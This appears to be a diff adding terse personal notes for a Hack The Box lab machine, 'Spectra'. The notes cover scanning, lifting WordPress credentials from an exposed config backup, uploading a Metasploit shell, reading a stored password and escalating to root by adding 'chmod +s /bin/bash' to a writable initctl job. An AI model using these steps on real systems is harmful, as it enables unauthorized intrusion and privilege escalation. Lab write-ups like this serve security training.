@@ -1,0 +1,37 @@
+nmap -sV -sC -oA initial.nmap 10.10.10.222
+
+go to 80
+check links
+add to etc hosts
+10.10.10.229    spectre.htb
+
+in production env
+view-source:http://spectra.htb/testing/wp-config.php.save
+
+devtest:devteam01
+
+same pass for administrator
+wp-admin= admin:devteam01
+
+msfconsole wpadmin shell upload
+cd .. because the folder of the shell gets deleted
+
+enumerate the box
+find in /opt the file autologin.conf.orig
+from that you'll see that theres a file in /etc/autologin/passwd
+cat /etc/autologin/passwd
+    SummerHereWeCome!!
+
+login as katie through ssh
+sudo -l shows initctl with sudo
+
+check for .conf services in /etc/init
+
+test.conf is writable to katie
+
+add chmod +s /bin/bash to test.conf
+
+sudo /sbin/initctl start test
+/bin/bash -p
+you should be root 
+
